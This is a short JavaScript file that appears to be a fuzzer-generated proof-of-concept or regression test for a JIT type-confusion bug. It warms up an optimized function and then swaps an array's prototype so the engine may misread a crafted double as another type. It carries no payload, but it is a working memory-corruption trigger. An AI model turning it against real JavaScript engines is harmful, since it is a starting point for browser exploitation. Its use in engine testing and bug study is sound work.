function opt(arr, proto) {
  arr[0] = 1.1;
  let tmp = {
    __proto__: proto
  };
  arr[0] = 2.3023e-320;
}

function main() {
  let arr = [1.1, 2.2, 3.3];

  var __es_v0 = "set".split("valueOf").reverse();

  for (let i = 0; i < 10000; i++) {
    var __es_v1 = new Map(3.3.toString());

    opt(arr, {});
  }

  opt(arr, arr);
  print(arr);
}

main();
